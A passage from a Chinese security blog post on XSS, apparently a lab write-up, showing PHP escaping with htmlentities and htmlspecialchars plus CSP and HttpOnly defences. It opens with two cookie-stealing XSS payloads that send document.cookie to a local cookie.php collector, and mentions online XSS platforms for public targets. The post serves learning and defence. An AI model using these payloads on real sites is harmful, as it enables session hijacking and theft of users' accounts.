+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;;window.location.href=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie//</span><br><span class="line">&#x27;;s=document.createElement(&#x27;script&#x27;);document.getElementsByTagName(&#x27;body&#x27;)[0]</span><br><span class="line">.appendChild(s);s.src=&#x27;http://127.0.0.1/cookie.php?cookie=&#x27;+document.cookie;//</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>这些只能在本地获取，不能获公网的，如果你有没有vps可以考虑在线xss平台</p>
+<p>网上很多，百度就行，使用方法看看也就能懂</p>
+<h2 id="四、XSS漏洞防范"><a href="#四、XSS漏洞防范" class="headerlink" title="四、XSS漏洞防范"></a>四、XSS漏洞防范</h2><h3 id="4-1-反射型xss漏洞防范"><a href="#4-1-反射型xss漏洞防范" class="headerlink" title="4.1 反射型xss漏洞防范"></a>4.1 反射型xss漏洞防范</h3><p>php中xss的漏洞防范方法总结：&lt;参考自Segmentfault&gt;</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">A.PHP直接输出html的，可以采用以下的方法进行过滤：</span><br><span class="line"></span><br><span class="line">    1.htmlspecialchars函数</span><br><span class="line">    2.htmlentities函数</span><br><span class="line">    3.HTMLPurifier.auto.php插件</span><br><span class="line">    4.RemoveXss函数</span><br><span class="line"></span><br><span class="line">B.PHP输出到JS代码中，或者开发Json API的，则需要前端在JS中进行过滤：</span><br><span class="line"></span><br><span class="line">    1.尽量使用innerText(IE)和textContent(Firefox),也就是jQuery的text()来输出文本内容</span><br><span class="line">    2.必须要用innerHTML等等函数，则需要做类似php的htmlspecialchars的过滤</span><br><span class="line"></span><br><span class="line">C.其它的通用的补充性防御手段</span><br><span class="line"></span><br><span class="line">    1.在输出html时，加上Content Security Policy的Http Header</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，嵌入第三方的脚本文件等）</span><br><span class="line">    （缺陷：IE或低版本的浏览器可能不支持）</span><br><span class="line">    2.在设置Cookie时，加上HttpOnly参数</span><br><span class="line">    （作用：可以防止页面被XSS攻击时，Cookie信息被盗取，可兼容至IE6）</span><br><span class="line">    （缺陷：网站本身的JS代码也无法操作Cookie，而且作用有限，只能保证Cookie的安全）</span><br><span class="line">    3.在开发API时，检验请求的Referer参数</span><br><span class="line">    （作用：可以在一定程度上防止CSRF攻击）</span><br><span class="line">    （缺陷：IE或低版本的浏览器中，Referer参数可以被伪造）</span><br></pre></td></tr></table></figure>
+
+<p>这里我们选用<code>htmlentities()</code>函数进行测试：</p>
+<blockquote>
+<p>htmlentities() 函数把字符转换为 HTML 实体。</p>
+</blockquote>
+<p>新建Xss_htmlentities.php， 代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt; </span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; </span><br><span class="line">&lt;title&gt;XSS&lt;/title&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; </span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;input&quot;&gt;     </span><br><span class="line">&lt;input type=&quot;submit&quot;&gt; </span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">$XssReflex = $_GET[&#x27;input&#x27;];</span><br><span class="line">echo &#x27;output:&lt;br&gt;&#x27;.htmlentities($XssReflex);#仅在这里对变量 $XssReflex 做了处理.</span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xsshtmlentities.php</code> :</p>
+<p><img src="xss-cookies/4.png" alt="img"></p>
+<p>当我们输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
+<p><img src="xss-cookies/3.png" alt="img"></p>
+<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
+<p><img src="xss-cookies/5.png" alt="1557672491438"> </p>
+<p>可以看到htmlentities()函数对用户输入的<code>&lt;&gt;</code>做了转义处理,恶意代码当然也就没法执行了。<br> 还有其他过滤函数，纸上学来终觉浅，有兴趣的同学可以自己去尝试一番</p>
+<h3 id="4-2-存储型xss漏洞防范"><a href="#4-2-存储型xss漏洞防范" class="headerlink" title="4.2 存储型xss漏洞防范"></a>4.2 存储型xss漏洞防范</h3><p>存储型XSS对用户的输入进行过滤的方式和反射型XSS相同，这里我们使用<code>htmlspecialchars()</code>函数进行演示：</p>
+<blockquote>
+<p>htmlentities() :把预定义的字符 “&lt;” （小于）和 “&gt;” （大于）转换为 HTML 实体</p>
+</blockquote>
+<p>htmlspecialchars和htmlentities的区别：</p>
+<p><code>htmlspecialchars</code> 只转义 <code>&amp; 、&quot; 、&#39; 、&lt; 、&gt;</code> 这几个html代码，而 <code>htmlentities</code> 却会转化所有的html代码，连同里面的它无法识别的中文字符也会转化。</p>
+<p>新建Xss_htmlspecialchars_Storage.php ，代码如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;span style=&quot;font-size:18px;&quot;&gt;&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;/&gt;  </span><br><span class="line">&lt;html&gt;  </span><br><span class="line">&lt;head&gt;  </span><br><span class="line">&lt;title&gt;XssStorage&lt;/title&gt;  </span><br><span class="line">&lt;/head&gt;  </span><br><span class="line">&lt;body&gt;  </span><br><span class="line">&lt;h2&gt;Message Board&lt;h2&gt;  </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;form action=&quot;Xss_htmlspecialchars_Storage.php&quot; method=&quot;post&quot;&gt;  </span><br><span class="line">Message:&lt;textarea id=&#x27;Mid&#x27; name=&quot;desc&quot;&gt;&lt;/textarea&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">&lt;br&gt;  </span><br><span class="line">Subuser:&lt;input type=&quot;text&quot; name=&quot;user&quot;/&gt;&lt;br&gt; </span><br><span class="line">&lt;br&gt;</span><br><span class="line">&lt;input type=&quot;submit&quot; value=&quot;submit&quot; onclick=&#x27;loction=&quot;XssStorage.php&quot;&#x27;/&gt;  </span><br><span class="line">&lt;/form&gt;  </span><br><span class="line">&lt;?php  </span><br><span class="line">if(isset($_POST[&#x27;user&#x27;])&amp;&amp;isset($_POST[&#x27;desc&#x27;]))&#123;  </span><br><span class="line">$log=fopen(&quot;sqlStorage.txt&quot;,&quot;a&quot;);  </span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&#x27;user&#x27;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&#x27;user&#x27;]进行过滤</span><br><span class="line">fwrite($log,htmlspecialchars($_POST[&#x27;desc&#x27;]).&quot;\r\n&quot;); # 在此对用户输入数据$_POST[&#x27;desc&#x27;]进行过滤</span><br><span class="line">fclose($log);  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(file_exists(&quot;sqlStorage.txt&quot;))  </span><br><span class="line">&#123;  </span><br><span class="line">$read= fopen(&quot;sqlStorage.txt&quot;,&#x27;r&#x27;);  </span><br><span class="line">while(!feof($read))  </span><br><span class="line">&#123;  </span><br><span class="line">    echo fgets($read).&quot;&lt;/br&gt;&quot;;  </span><br><span class="line">&#125;  </span><br><span class="line">fclose($read);  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt;  </span><br><span class="line">&lt;/body&gt;  </span><br><span class="line">&lt;/html&gt;&lt;/span&gt;  </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在Firefox输入url：<code>localhost/codoaudit/xss/Xss_htmlspecialchars_Storage.php</code> :</p>
+<p><img src="xss-cookies/3.png" alt="img"></p>
+<p>当我们在Message中输入<code>&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code> ：</p>
+<p><img src="xss-cookies/6.png" alt="1557672593579"></p>
+<p>可以看到页面并没有弹窗。<br> 我们再查看网页html代码：</p>
+<p><img src="xss-cookies/7.png" alt="1557672616306"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2019/04/22/sqlmap/" rel="prev" title="sqlmap">
+      <i class="fa fa-chevron-left"></i> sqlmap
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2019/04/22/xss-bypass/" rel="next" title="xss_bypass">
+      xss_bypass <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#xss%E5%88%86%E7%B1%BB"><span class="nav-number">1.</span> <span class="nav-text">xss分类</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#xss-Cookie%E8%8E%B7%E5%8F%96"><span class="nav-number">2.</span> <span class="nav-text">xss Cookie获取</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#pikachu-xss-%E4%B9%8Bjs%E8%BE%93%E5%87%BA"><span class="nav-number">2.0.0.0.1.</span> <span class="nav-text">pikachu xss 之js输出</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81XSS%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83"><span class="nav-number">2.1.</span> <span class="nav-text">四、XSS漏洞防范</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-1-%E5%8F%8D%E5%B0%84%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83"><span class="nav-number">2.1.1.</span> <span class="nav-text">4.1 反射型xss漏洞防范</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83"><span class="nav-number">2.1.2.</span> <span class="nav-text">4.2 存储型xss漏洞防范</span></a></li></ol></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Erlee"
+      src="/images/erlee.png">
+  <p class="site-author-name" itemprop="name">Erlee</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">豫ICP备 19040334号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Erlee</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
